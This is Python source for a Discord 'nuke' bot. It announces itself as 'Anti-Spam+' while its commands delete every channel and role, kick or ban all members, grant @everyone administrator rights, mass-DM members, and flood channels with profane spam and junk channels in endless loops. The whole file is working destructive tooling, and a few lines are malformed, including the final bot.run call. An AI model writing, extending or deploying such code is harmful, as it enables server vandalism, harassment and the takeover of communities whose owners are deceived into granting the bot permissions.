import discord
from discord.ext import commands
import random
from discord import Permissions
import webserver
from webserver import keep_alive
import os
import asyncio



CHANNEL_NAMES = ["get nuked", "delete the server", "get fucked", "trash server"]
 
MESSAGE_CONTENTS = ["@everyone Get Fucking Nuked :clown:","@everyone Get Nuked :crab: https://images.immediate.co.uk/production/volatile/sites/7/2018/11/GettyImages-107808064-6eb5e54.jpg?quality=45&resize=620,413", "@everyone Delete the Server"]

 

bot = commands.Bot(command_prefix='[')

client = commands.Bot(command_prefix='[')

bot.remove_command('help')

@bot.event
async def on_ready():
   game = discord.Game("My prefix is [ Do [cmds for help")
   await bot.change_presence(status=discord.Status.online, activity=game)
   print("Anti-Spam+ is Online")
   print("Bot made by Kaotic, Bancer and XxGamerBroskixX")


@bot.command()
async def cmds(ctx):
 embed = discord.Embed(color=ctx.author.color, timestamp=ctx.message.created_at)

 embed.set_author(name="Nuke Commands", icon_url=ctx.author.avatar_url)
 
 embed.add_field(name="cmds", value="shows this message.", inline=False)
 embed.add_field(name="nuke", value="nukes the server.", inline=False)
 embed.add_field(name="nick <nickname>", value="Mass nickname change.", inline=False)
 embed.add_field(name="message <message>", value="Dms everyone.", inline=False)
 embed.add_field(name="spam", value="Spams all channels.", inline=False)
 embed.add_field(name="spam2", value="Spams the channel.", inline=False)
 embed.add_field(name="roles", value="Spams roles.", inline=False)
 embed.add_field(name="delete", value="Deletes all channels.", inline=False)
 embed.add_field(name="channels", value="Creates channels.", inline=False)
 embed.add_field(name="kick", value="Kicks everyoner.", inline=False)
 embed.add_field(name="ban", value="Bans all users.", inline=False)
 embed.add_field(name="ban2 <user>", value="Purges Bans specified user..", inline=False)
 embed.add_field(name="purge <amount>", value="Purges messages.", inline=False)
 embed.add_field(name="admin",value="Gives @everyone admin.", inline=False)

 await ctx.send(embed=embed)

@bot.command(pass_context=True)
async def nick(ctx, rename_to):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print (f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
            except:
                print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
        print ("Action Completed: change nick")

@bot.command(pass_context=True)
async def ban2(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()


@bot.command(pass_context=True)
async def message(ctx, *, message):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"{user.name} has recieved the message.")
            except:
                print(f"{user.name} has NOT recieved the message.")
        print("Action Completed: Message")


@bot.command(pass_context=True)
async def nuke(ctx, amount=500):
        await ctx.message.delete()
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print (f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
        for user in list(ctx.guild.members):
            try:         
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
                guild = ctx.message.guild 
        for i in range(amount):
           await guild.create_text_channel(random.choice(CHANNEL_NAMES))
        print ('Action NUKE complete')

@bot.command(pass_context=True)
async def ban(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print ("Action Completed: Banned")  

@bot.command(pass_context=True)
async def clear(ctx, amount=100000):
    await ctx.channel.purge(limit=amount)

#WARNING this command will rate limit the bot
@bot.command(pass_context=True)
async def roles(ctx): 
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="Get Fucked")


@bot.command(pass_context=True)
async def spam2(ctx): 
    await ctx.message.delete()
    while True:
    
     await ctx.send("@everyone") 

@bot.command(pass_context=True)
async def spam(ctx, amount=100000):
    await ctx.message.delete()
    if not amount is None:
        for _ in range(amount):
            for channel in ctx.guild.text_channels:
              await channel.send(random.choice(MESSAGE_CONTENTS))
    else:
        while True:  
            for channel in ctx.guild.text_channels: 
              await channel.send(random.choice(MESSAGE_CONTENTS))      

@bot.command(pass_context=True)
async def kick(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print ("Action Completed: Kicked")  
 
@bot.command(pass_context=True)
async def ping(ctx):
  await ctx.message.delete()
  latency = bot.latency  
  await ctx.send(latency)
  print(latency)
  await ctx.send("Pong!")
  print ("Pong!")   
 
@bot.command(pass_context=True)
async def admin(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
             if role.name == '@everyone':
                  try:
                      await role.edit(permissions=Permissions.all())
                      print("@everyone has admin") 
                  except:
                      print("@everyone does NOT have admin")

@bot.command()
async def userinfo(ctx, member: discord.Member):
  member = ctx.author if not member else member
  roles = [role for role in member.roles]

  embed = discord.Embed(colour=member.color, timestamp=ctx.message.created_at)
  
  embed.set_author(name=f"User Info - {member}")
  embed.set_thumbnail(url=member.avatar_url)
  embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.avatar_url)

  embed.add_field(name="User ID", value=member.id)
  embed.add_field(name="Nickname", value=member.display_name)

  embed.add_field(name="Creation Date", value=member.created_at.strftime("%a, %#d %B, %Y, %I:%M %p UTC"))
  embed.add_field(name="Guild Join Date", value=member.joined_at.strftime("%a, %#d %B, %Y, %I:%M %p UTC"))

  embed.add_field(name=f"Roles ({len(roles)})", value=" ".join([role.mention for role in roles]))
  embed.add_field(name="Highest Role", value=member.top_role.mention)

  embed.add_field(name="Bot?", value=member.bot)

  await ctx.send(embed=embed)

@bot.command(pass_context=True)
async def delete(ctx):
  for channel in ctx.guild.channels:
    print(f"Deleting channel {channel.name}")
    await channel.delete()

@bot.command(pass_context=True)
async def channels(ctx, amount=500):
    await ctx.message.delete()
    guild = ctx.message.guild 
    for i in range(amount):
        await guild.create_text_channel(random.choice(CHANNEL_NAMES))

bot.run(Bot Token Here)
